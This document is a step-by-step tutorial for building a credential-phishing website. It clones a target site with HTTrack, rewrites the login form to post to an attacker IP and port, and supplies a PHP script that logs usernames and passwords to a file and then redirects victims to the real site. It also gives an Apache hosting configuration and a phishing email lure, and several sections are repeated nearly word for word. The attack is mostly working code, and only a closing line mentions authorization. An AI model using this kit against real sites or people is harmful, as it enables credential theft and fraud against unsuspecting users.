# Summary
Website spoofing involves creating a fake website that mimics a legitimate one to deceive users into providing sensitive information, such as login credentials or financial details. Attackers use this technique to harvest credentials, spread malware, or perform phishing attacks.

Here's an overview of how you could create a spoofed website to capture user credentials:

1. **Clone the Target Website:** Create a replica of the target website that looks identical to the legitimate one.
2. **Modify the Clone:** Alter the cloned website to include malicious code that captures and transmits user inputs (e.g., login credentials) to an attacker-controlled server.
3. **Host the Spoofed Website:** Deploy the modified website on a server controlled by the attacker.
4. **Direct Traffic to the Spoofed Website:** Use techniques such as phishing emails, social engineering, or DNS poisoning to redirect users to the spoofed website.
5. **Capture and Exfiltrate Data:** Collect the data entered by unsuspecting users on the spoofed website and exfiltrate it to a secure location.

# Execution
To execute website spoofing, follow these steps:

1. **Clone the Target Website:** Use tools like HTTrack or manual techniques to download the target website's content.
2. **Modify the Clone:** Insert malicious code into the cloned website to capture user inputs and send them to the attacker's server.
3. **Host the Spoofed Website:** Deploy the modified website on a server controlled by the attacker.
4. **Direct Traffic to the Spoofed Website:** Use phishing emails or other social engineering techniques to lure victims to the spoofed website.

#### Step 1: Clone the Target Website
Using HTTrack to clone a website:

```
httrack https://example.com -O /path/to/local/directory
```

#### Step 2: Modify the Clone
Open the cloned website files and modify the form action to send the data to your server:

##### Original Form

```
<form action="https://example.com/login" method="post">
    <input type="text" name="username" />
    <input type="password" name="password" />
    <input type="submit" value="Login" />
</form>
```

##### Modified Form

```
<form action="http://<attack_ip>:<attack_port>/capture" method="post">
    <input type="text" name="username" />
    <input type="password" name="password" />
    <input type="submit" value="Login" />
</form>
```

Create a simple server script to capture the credentials:

##### Example PHP Script (capture.php)

```
<?php
file_put_contents("credentials.txt", "Username: " . $_POST['username'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://example.com'); // Redirect to the legitimate website
exit();
?>
```

#### Step 3: Host the Spoofed Website
Deploy the modified website on your server using a web server like Apache or Nginx.

##### Example Apache Configuration

```
<VirtualHost *:80>
    ServerAdmin admin@<attack_ip>
    DocumentRoot /path/to/spoofed/website
    ServerName spoofed-website.com

    <Directory /path/to/spoofed/website>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```
#### Step 4: Direct Traffic to the Spoofed Website
Craft a phishing email to lure victims to the spoofed website:

##### Example Phishing Email

```
Subject: Important Account Update

Dear User,

We have noticed unusual activity on your account. Please click the link below to verify your account details:

```
#### Step 5: Capture and Exfiltrate Data
Monitor the credentials.txt file on your server to view captured credentials.

# Example Execution
Below is a simplified walkthrough:

#### Step 1: Clone the Target Website

```
httrack https://example.com -O /path/to/local/directory
```

#### Step 2: Modify the Clone
Modify the login form to send data to your server:

##### Original Form

```
<form action="https://example.com/login" method="post">
    <input type="text" name="username" />
    <input type="password" name="password" />
    <input type="submit" value="Login" />
</form>
```

##### Modified Form

```
<form action="http://<attack_ip>:<attack_port>/capture" method="post">
    <input type="text" name="username" />
    <input type="password" name="password" />
    <input type="submit" value="Login" />
</form>
```

Create a PHP script to capture credentials:

##### capture.php

```
<?php
file_put_contents("credentials.txt", "Username: " . $_POST['username'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://example.com'); // Redirect to the legitimate website
exit();
?>
```
#### Step 3: Host the Spoofed Website
Deploy the spoofed website on your server:

##### Example Apache Configuration

```
<VirtualHost *:80>
    ServerAdmin admin@<attack_ip>
    DocumentRoot /path/to/spoofed/website
    ServerName spoofed-website.com

    <Directory /path/to/spoofed/website>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```
#### Step 4: Direct Traffic to the Spoofed Website
Send a phishing email to potential victims:

##### Example Phishing Email

```
Subject: Important Account Update

Dear User,

We have noticed unusual activity on your account. Please click the link below to verify your account details:

http://spoofed-website.com/login

Thank you,
Customer Support
```

#### Step 5: Capture and Exfiltrate Data
Check the `credentials.txt` file on your server to view captured credentials:

```
cat /path/to/spoofed/website/credentials.txt
```

This process demonstrates how an attacker could create and deploy a spoofed website to capture user credentials through phishing techniques. Ensure that you have proper authorization before conducting any similar activities in a controlled and ethical environment.
